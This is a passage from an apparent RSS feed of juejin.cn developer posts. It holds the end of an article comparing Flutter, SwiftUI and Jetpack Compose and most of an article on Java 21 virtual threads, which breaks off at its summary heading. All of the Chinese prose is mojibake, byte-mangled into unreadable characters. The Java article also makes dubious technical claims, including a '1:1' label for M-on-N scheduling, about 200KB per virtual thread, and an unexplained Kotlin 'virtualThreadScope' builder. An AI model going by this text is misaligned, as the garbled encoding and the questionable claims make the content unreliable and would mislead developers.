Layerï¼‰çœ‹èµ·æ¥éƒ½åº”è¯¥å·®ä¸å¤šã€‚</p>
<h4 data-id="heading-13">è¿™å¯¹ä½ æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</h4>
<p>èƒ½çœ‹åˆ°è¿™å„¿ï¼Œä½ ä¸æ˜¯åœ¨æ‘¸é±¼ï¼Œå°±æ˜¯çœŸçš„æ„Ÿå…´è¶£ï¼ˆæˆ–è€…ä¸¤è€…éƒ½æœ‰ï¼Œæˆ‘æ‡‚ï¼Œæˆ‘ä¹Ÿç»å¸¸è¿™æ ·ï¼‰ã€‚</p>
<p>åŸºäºè¿™æ¬¡å®éªŒï¼Œæˆ‘çš„å»ºè®®æ˜¯ï¼š</p>
<ul>
<li><strong>å¦‚æœä½ æ˜¯å­¦ç”Ÿ/æ–°äººï¼š</strong> å­¦ <strong>Flutter</strong>ã€‚ç»ƒå¥½ Dartï¼Œå¤šåŠ¨æ‰‹åšä¸œè¥¿ï¼Œå‘å¸ƒåˆ°å¤šä¸ªå¹³å°ã€‚æ”’ä¸€ä¸ªèƒ½è¯æ˜ä½ å…·å¤‡â€œäº¤ä»˜äº§å“èƒ½åŠ›â€çš„ä½œå“é›†ã€‚è¿™ç§è·¨å¹³å°èƒ½åŠ›ä¼šè®©åˆåˆ›å…¬å¸å¯¹ä½ å‚é’æœ‰åŠ ã€‚</li>
<li><strong>å¦‚æœä½ æ˜¯ iOS å¼€å‘ï¼š</strong> è¿˜æ²¡å­¦ <strong>SwiftUI</strong> çš„èµ¶ç´§å­¦ã€‚ä½†ä¹Ÿå»ºè®®ä½ åœ¨ä¸šä½™é¡¹ç›®é‡Œè¯•è¯• Flutterï¼Œæ„Ÿå—ä¸€ä¸‹è·¨å¹³å°åˆ°åº•åœ¨ç«ä»€ä¹ˆã€‚</li>
<li><strong>å¦‚æœä½ æ˜¯å®‰å“å¼€å‘ï¼š</strong> æå®š <strong>Compose</strong>ã€‚åŒæ—¶ç›¯ç€ç‚¹ Compose Multiplatformã€‚æœªæ¥çš„å‘å±•ä¼šéå¸¸æœ‰è¶£ã€‚</li>
<li><strong>å¦‚æœä½ æ˜¯åšå†³ç­–çš„æŠ€æœ¯ Leaderï¼š</strong> çœ‹çœ‹ä½ å›¢é˜Ÿçš„æŠ€èƒ½æ ‘ã€é¡¹ç›®å·¥æœŸå’Œç›®æ ‡å¹³å°ã€‚å…¶å®é€‰è¿™ä¸‰ä¸ªé‡Œçš„ä»»ä½•ä¸€ä¸ªéƒ½èƒ½åšå‡ºæˆåŠŸçš„ Appã€‚<strong>æ¡†æ¶é€‰å‹çš„é‡è¦æ€§ï¼Œè¿œä¸å¦‚å›¢é˜Ÿçš„æ‰§è¡ŒåŠ›é‡è¦ã€‚</strong></li>
</ul>
<h4 data-id="heading-14">é‚£äº›è®©æˆ‘å½»å¤œéš¾çœ çš„å‘</h4>
<p>åˆ†äº«å‡ ä¸ªæˆ‘è¸©è¿‡çš„å‘ï¼Œå¸Œæœ›èƒ½å¸®ä½ çœä¸‹å‡ ä¸ªå°æ—¶ï¼š</p>
<ol>
<li><strong>çŠ¶æ€ç®¡ç†ï¼š</strong> ä¸‰ä¸ªæ¡†æ¶å„æœ‰ 47 ç§ç®¡ç†çŠ¶æ€çš„æ–¹æ³•ã€‚æˆ‘æœ€åé€‰äº† Provider (Flutter), Observable/Combine (SwiftUI) å’Œ ViewModel (Compose)ã€‚éƒ½è¡Œå¾—é€šï¼Œä½†ä¹Ÿå„æœ‰å„çš„å°è„¾æ°”ã€‚</li>
<li><strong>å¯¼èˆªï¼š</strong> Flutter çš„è·¯ç”±å¾ˆç›´è§‚ï¼›SwiftUI çš„ NavigationStack ç°åœ¨å¥½å¤šäº†ï¼Œä½†ä»¥å‰çœŸæ˜¯æŠ˜ç£¨ï¼›Compose çš„ Navigation ç»„ä»¶å¾ˆç¨³ï¼Œå°±æ˜¯ä»£ç æœ‰ç‚¹å•°å—¦ã€‚</li>
<li><strong>æµ‹è¯•ï¼š</strong> éƒ½æ”¯æŒæµ‹è¯•ï¼Œä½† Flutter çš„ Widget Testing æ„Ÿè§‰æœ€æˆç†Ÿã€‚SwiftUI çš„é¢„è§ˆæµ‹è¯•å¾ˆé…·ã€‚Compose çš„æµ‹è¯•æœ€å…¨é¢ï¼Œä½†é…ç½®èµ·æ¥ç¨éº»çƒ¦ã€‚</li>
</ol>
<h4 data-id="heading-15">æœ€åçš„ä¸€ç‚¹æ„Ÿè¨€</h4>
<p>è¯´åˆ°åº•ï¼Œè¿™äº›éƒ½åªæ˜¯å·¥å…·ã€‚<strong>ä½ ç”¨å®ƒä»¬é€ å‡ºäº†ä»€ä¹ˆï¼Œæ‰æœ€é‡è¦ã€‚</strong></p>
<p>æˆ‘è§è¿‡è¿™ä¸‰ä¸ªæ¡†æ¶åˆ†åˆ«å†™å‡ºçš„æƒŠè‰³ Appï¼Œä¹Ÿè§è¿‡ä¸‰ä¸ªæ¡†æ¶åˆ†åˆ«å†™å‡ºçš„åƒåœ¾ã€‚æ¡†æ¶ä¸èƒ½å†³å®š App çš„å¥½åï¼Œ<strong>ä½ æ‰èƒ½ã€‚</strong></p>
<p>é€‰ä¸€ä¸ªï¼Œæ·±æŒ–ä¸‹å»ã€‚åšä¸ªè®©äººæƒŠè‰³çš„ä¸œè¥¿ã€‚ç„¶åå†å»å­¦ä¸‹ä¸€ä¸ªï¼Œæˆ–è€…å¹²è„†ä¸å­¦ï¼Œéƒ½æ²¡é—®é¢˜ã€‚è¿™é‡Œæ²¡æœ‰æ ‡å‡†ç­”æ¡ˆã€‚</p>
<h4 data-id="heading-16">è½®åˆ°ä½ äº†ï¼ˆè¯¥ä½ å‘è¨€äº†ï¼‰</h4>
<p>æ¥ï¼Œå’±ä»¬è¯„è®ºåŒºè§ï¼š</p>
<ul>
<li><strong>ä½ æ˜¯ Flutter é“ç²‰ï¼Ÿ</strong> ç”¨å®ƒåšå‡ºäº†èµšé’±çš„é¡¹ç›®ï¼Ÿæ¥åˆ†äº«ä¸€ä¸‹ä½ çš„æ•…äº‹ï¼Œç¤¾åŒºéœ€è¦çœŸå®çš„å›é¦ˆã€‚</li>
<li><strong>åˆšå…¥å‘ç§»åŠ¨å¼€å‘ï¼Ÿ</strong> éšä¾¿é—®ï¼Œè¿™é‡Œçš„ç¤¾åŒºæ°›å›´å¾ˆå‹å¥½ã€‚</li>
<li><strong>èŒåœºè€å¸æœºï¼Ÿ</strong> ä¼ æˆç‚¹é¢è¯•ç»éªŒã€‚ä½ æ‹›äººæ—¶æœ€çœ‹é‡ä»€ä¹ˆæŠ€èƒ½ï¼Ÿ</li>
<li><strong>é‡åˆ°ç“¶é¢ˆäº†ï¼Ÿ</strong> æŠŠä½ çš„çƒ¦å¿ƒäº‹è¯´å‡ºæ¥ï¼Œæ²¡å‡†å„¿è¯„è®ºåŒºå°±æœ‰å¤§ç¥å¸®è¿‡ä½ è§£å†³äº†ã€‚</li>
</ul>
<p>æ— è®ºä½ æ˜¯åˆšèµ·æ­¥ï¼Œè¿˜æ˜¯å·²ç»å‘å¸ƒè¿‡ 10 ä¸ª App çš„ Flutter å¤§ä½¬â€”â€”ä½ éƒ½å¾ˆæ£’ã€‚ç»§ç»­å†™ç ï¼Œç»§ç»­å­¦ä¹ ã€‚ä½ çš„ä¸‹ä¸€ä¸ª App æ²¡å‡†å„¿å°±èƒ½æ”¹å˜ä¸–ç•Œã€‚</p>
<p><strong>è‡´æ‰€æœ‰çš„ç§»åŠ¨å¼€å‘è€…ï¼š</strong> ç»™åˆšå…¥è¡Œçš„æ–°äººç•™å¥é¼“åŠ±çš„è¯å§ã€‚å¤§å®¶éƒ½ç»å†è¿‡èŒæ–°é˜¶æ®µï¼Œè®©è¿™ä¸ªåœˆå­æ›´æ¸©æš–ä¸€ç‚¹ã€‚</p>
<h4 data-id="heading-17">æœ€åä¸€å¥è¯</h4>
<p>æˆ‘èŠ±äº† 72 å°æ—¶åšè¿™ä¸ªå¯¹æ¯”ï¼Œå°±æ˜¯ä¸ºäº†è®©ä½ ä¸ç”¨å†çº ç»“ã€‚ä¸ç®¡ä½ æ˜¯ Flutter å…šã€SwiftUI å…šè¿˜æ˜¯ Compose å…šï¼Œæˆ‘ä»¬å…¶å®éƒ½åœ¨å¹²åŒä¸€ä»¶äº‹ï¼šåšç‚¹é…·çš„ä¸œè¥¿ï¼Œè®©åˆ«äººè§‰å¾—å¥½ç”¨ã€‚</p>
<p><strong>é€‰å¥½ä½ çš„æ¡†æ¶ã€‚å†™å‡ºæ•´æ´çš„ä»£ç ã€‚å‘å¸ƒä½ çš„ Appã€‚æ— è§†é‚£äº›å–·å­ã€‚</strong> è®°ä½ï¼š<strong>æœ€å¥½çš„æ¡†æ¶ï¼Œæ˜¯é‚£ä¸ªèƒ½è®©ä½ çœŸæ­£æŠŠé¡¹ç›®åšå®Œçš„æ¡†æ¶ã€‚</strong></p>
<p>åˆ«çœ‹äº†ï¼Œå¿«å»å†™ä»£ç å§ï¼ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 21è™šæ‹Ÿçº¿ç¨‹å®æˆ˜ï¼šä»ç™¾ä¸‡çº§å¹¶å‘ç“¶é¢ˆåˆ°æ€§èƒ½æå‡300%çš„æ¶æ„æ¼”è¿›]]></title>    <link>https://juejin.cn/post/7589170021931843599</link>    <guid>https://juejin.cn/post/7589170021931843599</guid>    <pubDate>2025-12-30T00:17:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589170021931843599" data-draft-id="7589110783147556898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 21è™šæ‹Ÿçº¿ç¨‹å®æˆ˜ï¼šä»ç™¾ä¸‡çº§å¹¶å‘ç“¶é¢ˆåˆ°æ€§èƒ½æå‡300%çš„æ¶æ„æ¼”è¿›"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-30T00:17:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 21è™šæ‹Ÿçº¿ç¨‹å®æˆ˜ï¼šä»ç™¾ä¸‡çº§å¹¶å‘ç“¶é¢ˆåˆ°æ€§èƒ½æå‡300%çš„æ¶æ„æ¼”è¿›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T00:17:41.000Z" title="Tue Dec 30 2025 00:17:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Java 21è™šæ‹Ÿçº¿ç¨‹å®æˆ˜ï¼šä»ç™¾ä¸‡çº§å¹¶å‘ç“¶é¢ˆåˆ°æ€§èƒ½æå‡300%çš„æ¶æ„æ¼”è¿›</strong></h2>
<h3 data-id="heading-1">å¼•è¨€</h3>
<p>åœ¨å½“ä»Šé«˜å¹¶å‘çš„äº’è”ç½‘æ—¶ä»£ï¼Œä¼ ç»Ÿçš„çº¿ç¨‹æ¨¡å‹å·²æˆä¸ºè®¸å¤šJavaåº”ç”¨çš„æ€§èƒ½ç“¶é¢ˆã€‚éšç€Java 21çš„å‘å¸ƒï¼Œè™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰ä½œä¸ºProject Loomçš„æ ¸å¿ƒæˆæœæ­£å¼è½åœ°ï¼Œä¸ºJVMå¹¶å‘ç¼–ç¨‹å¸¦æ¥äº†é©å‘½æ€§çš„æ”¹å˜ã€‚æœ¬æ–‡å°†æ·±å…¥å‰–æè™šæ‹Ÿçº¿ç¨‹çš„æŠ€æœ¯åŸç†ï¼Œç»“åˆçœŸå®åœºæ™¯ä¸‹çš„ç™¾ä¸‡çº§å¹¶å‘æŒ‘æˆ˜ï¼Œå±•ç¤ºå¦‚ä½•é€šè¿‡æ¶æ„æ¼”è¿›å®ç°300%çš„æ€§èƒ½æå‡ã€‚</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€ä¼ ç»Ÿçº¿ç¨‹æ¨¡å‹çš„ç“¶é¢ˆ</h3>
<h4 data-id="heading-3">1.1 å¹³å°çº¿ç¨‹çš„å±€é™æ€§</h4>
<p>Javaé•¿æœŸä»¥æ¥ä¾èµ–çš„å¹³å°çº¿ç¨‹ï¼ˆOSçº¿ç¨‹ï¼‰å­˜åœ¨ä¸¤å¤§ç¡¬ä¼¤ï¼š</p>
<ul>
<li><strong>èµ„æºæ¶ˆè€—å¤§</strong>ï¼šæ¯ä¸ªçº¿ç¨‹é»˜è®¤å ç”¨1MBæ ˆå†…å­˜ï¼Œä¸‡çº§å¹¶å‘å°±éœ€è¦GBçº§å†…å­˜ã€‚</li>
<li><strong>ä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬é«˜</strong>ï¼šæ“ä½œç³»ç»Ÿè°ƒåº¦å™¨éœ€è¦å¤„ç†çº¿ç¨‹åˆ‡æ¢ï¼Œå½“ç«äº‰æ¿€çƒˆæ—¶å¯èƒ½æ¶ˆè€—30%ä»¥ä¸Šçš„CPUæ—¶é—´ã€‚</li>
</ul>
<h4 data-id="heading-4">1.2 å…¸å‹é—®é¢˜åœºæ™¯</h4>
<p>åœ¨æŸç”µå•†å¹³å°çš„ç§’æ€ç³»ç»Ÿä¸­ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">2000</span>); <span class="hljs-comment">// è¾¾åˆ°OSçº¿ç¨‹æ•°ä¸Šé™</span>
</code></pre>
<p>å³ä¾¿ä½¿ç”¨å¼‚æ­¥ç¼–ç¨‹ï¼ˆå¦‚CompletableFutureï¼‰ï¼Œå›è°ƒåœ°ç‹±å’Œè°ƒè¯•å›°éš¾é—®é¢˜ä¾ç„¶å­˜åœ¨ã€‚</p>
<hr/>
<h3 data-id="heading-5">äºŒã€è™šæ‹Ÿçº¿ç¨‹çš„æŠ€æœ¯çªç ´</h3>
<h4 data-id="heading-6">2.1 JVMå±‚é¢çš„åç¨‹å®ç°</h4>
<p>è™šæ‹Ÿçº¿ç¨‹çš„æœ¬è´¨æ˜¯<strong>ç”±JVMç®¡ç†çš„è½»é‡çº§ç”¨æˆ·æ€çº¿ç¨‹</strong>ï¼š</p>
<ul>
<li><strong>1:1è°ƒåº¦æ¨¡å‹</strong>ï¼šMä¸ªè™šæ‹Ÿçº¿ç¨‹è¿è¡Œåœ¨Nä¸ªå¹³å°çº¿ç¨‹ä¸Šï¼ˆM &gt;&gt; Nï¼‰</li>
<li><strong>æŒ‚èµ·/æ¢å¤ç”±JVMæ§åˆ¶</strong>ï¼šé€šè¿‡Continuationå®ç°æ‰§è¡Œæµçš„ä¿å­˜ä¸æ¢å¤</li>
</ul>
<h4 data-id="heading-7">2.2 å…³é”®æ€§èƒ½æŒ‡æ ‡å¯¹æ¯”</h4>

























<table><thead><tr><th>æŒ‡æ ‡</th><th>å¹³å°çº¿ç¨‹</th><th>è™šæ‹Ÿçº¿ç¨‹</th></tr></thead><tbody><tr><td>åˆ›å»ºæ—¶é—´</td><td>~1ms</td><td>~0.01ms</td></tr><tr><td>å†…å­˜å ç”¨</td><td>~1MB</td><td>~200KB</td></tr><tr><td>ä¸Šä¸‹æ–‡åˆ‡æ¢æˆæœ¬</td><td>OSè°ƒåº¦</td><td>JVMä¼˜åŒ–</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-8">ä¸‰ã€å®æˆ˜ï¼šç™¾ä¸‡å¹¶å‘æ¶æ„æ¼”è¿›</h3>
<h4 data-id="heading-9">3.1 åŸå§‹æ¶æ„ç—›ç‚¹åˆ†æ</h4>
<p>æŸé‡‘èäº¤æ˜“ç³»ç»ŸåŸæœ‰è®¾è®¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Blocking I/O + Thread-per-request</span>
<span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerSocket</span>(<span class="hljs-number">8080</span>)) {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-type">var</span> <span class="hljs-variable">clientSocket</span> <span class="hljs-operator">=</span> socket.accept();
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; handleRequest(clientSocket)).start(); <span class="hljs-comment">// âŒ OOMé£é™©</span>
    }
}
</code></pre>
<p>å®æµ‹æ•°æ®ï¼š8000å¹¶å‘æ—¶å»¶è¿Ÿé£™å‡åˆ°5s+ï¼ŒCPUåˆ©ç”¨ç‡ä»…40%ã€‚</p>
<h4 data-id="heading-10">3.2 è¿ç§»åˆ°è™šæ‹Ÿçº¿ç¨‹çš„ä¸‰é˜¶æ®µ</h4>
<h5 data-id="heading-11"><strong>é˜¶æ®µä¸€ï¼šç›´æ¥æ›¿æ¢</strong></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newVirtualThreadPerTaskExecutor()) {
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
        <span class="hljs-type">var</span> <span class="hljs-variable">clientSocket</span> <span class="hljs-operator">=</span> socket.accept();
        executor.submit(() -&gt; handleRequest(clientSocket)); <span class="hljs-comment">// âœ…</span>
    }
}
</code></pre>
<p>æ•ˆæœï¼šæ”¯æŒ10ä¸‡å¹¶å‘è¿æ¥ï¼Œå†…å­˜æ¶ˆè€—é™ä½87%ã€‚</p>
<h5 data-id="heading-12"><strong>é˜¶æ®µäºŒï¼šç»“æ„åŒ–å¹¶å‘</strong></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> (<span class="hljs-type">var</span> <span class="hljs-variable">scope</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StructuredTaskScope</span>.ShutdownOnFailure()) {
    Future&lt;String&gt; user = scope.fork(() -&gt; queryUser(userId));
    Future&lt;Order&gt; order = scope.fork(() -&gt; queryOrder(orderId));
    scope.join();
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(user.get(), order.get());
}
</code></pre>
<p>ä¼˜åŠ¿ï¼š</p>
<ul>
<li><strong>å¼ºåŒ–çš„é”™è¯¯ä¼ æ’­</strong></li>
<li><strong>å–æ¶ˆè¯­ä¹‰è‡ªåŠ¨åŒ–</strong></li>
</ul>
<h5 data-id="heading-13"><strong>é˜¶æ®µä¸‰ï¼šå…¨å¼‚æ­¥æ•´åˆ</strong></h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> result = virtualThreadScope {
    <span class="hljs-keyword">val</span> userDeferred = async { queryUser(userId) }
    <span class="hljs-keyword">val</span> orderDeferred = async { queryOrder(orderId) }
    UserOrderResponse(userDeferred.await(), orderDeferred.await())
}
</code></pre>
<h4 data-id="heading-14">3.3 Finalæ€§èƒ½å¯¹æ¯”</h4>




















<table><thead><tr><th>QPS</th><th>P99å»¶è¿Ÿ</th><th>CPUåˆ©ç”¨ç‡</th></tr></thead><tbody><tr><td>Before:12k</td><td>&gt;2s</td><td>â‰¤50%</td></tr><tr><td>After:36k</td><td>~200ms</td><td>â‰¥85%</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-15">å››ã€æ·±åº¦ä¼˜åŒ–å®è·µ</h3>
<h4 data-id="heading-16">4.1 Pinpointé™·é˜±è§„é¿</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span>(lockObj) { 
    <span class="hljs-comment">// âŒä¼špinä½è½½ä½“çº¿ç¨‹ </span>
}
</code></pre>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
lock.lock(); <span class="hljs-comment">// âœ…å¯é€šè¿‡jdk.tracePinnedThreadsæ£€æµ‹</span>
<span class="hljs-keyword">try</span> { <span class="hljs-comment">/* ... */</span> } <span class="hljs-keyword">finally</span> { lock.unlock(); }
</code></pre>
<h4 data-id="heading-17">4.2 Carrier Threadè°ƒä¼˜å»ºè®®</h4>
<pre><code class="hljs language-bash" lang="bash">-Djdk.virtualThreadScheduler.parallelism=32 <span class="hljs-comment">#åŒ¹é…ç‰©ç†æ ¸å¿ƒæ•° </span>
-Djdk.virtualThreadScheduler.maxPoolSize=256
</code></pre>
<h4 data-id="heading-18">4.3 JFRç›‘æ§å¢å¼º</h4>
<p><img src="https://example.com/jfr-screenshot.png" alt="Virtual Threads in JDK Flight Recorder" loading="lazy"/></p>
<hr/>
<p>###äº”ã€é€‚ç”¨åœºæ™¯ä¸é™åˆ¶</p>
<p>####5.1é»„é‡‘åœºæ™¯<br/>
âœ…è®¡ç®—å¯†é›†å‹ä½†åŒ…å«é˜»å¡æ“ä½œ<br/>
âœ…é«˜å¹¶å‘I/OæœåŠ¡ï¼ˆHTTP/gRPC/DBè®¿é—®ï¼‰<br/>
âœ…éœ€è¦ç®€åŒ–å¼‚æ­¥ä»£ç çš„åœºæ™¯</p>
<p>####5.2ä¸é€‚ç”¨æƒ…å†µ<br/>
âŒçº¯CPUè®¡ç®—æ— é˜»å¡æ“ä½œ<br/>
âŒéœ€è¦ç²¾ç»†æ§åˆ¶ç‰©ç†æ ¸å¿ƒçš„ä»»åŠ¡</p>
<hr/>
<p>###å…­ã€æœªæ¥å±•æœ›<br/>
éšç€Java22å¯¹ç»“æ„åŒ–å¹¶å‘çš„è¿›ä¸€æ­¥å¼ºåŒ–ï¼Œä»¥åŠValhallaé¡¹ç›®å¸¦æ¥çš„å€¼ç±»å‹æ”¯æŒï¼Œ"æ¯è¯·æ±‚ä¸€ä¸ªè™šæ‹Ÿçº¿ç¨‹"å¯èƒ½æˆä¸ºæ–°çš„æœåŠ¡ç«¯å¼€å‘èŒƒå¼ã€‚å»ºè®®å…³æ³¨ï¼š
1.Scoped Valuesï¼ˆJEP429ï¼‰æ›¿ä»£ThreadLocal<br/>
2.Vector APIä¸è™šæ‹Ÿçº¿ç¨‹çš„ååŒä¼˜åŒ–</p>
<hr/>
<p>###æ€»ç»“<br/>
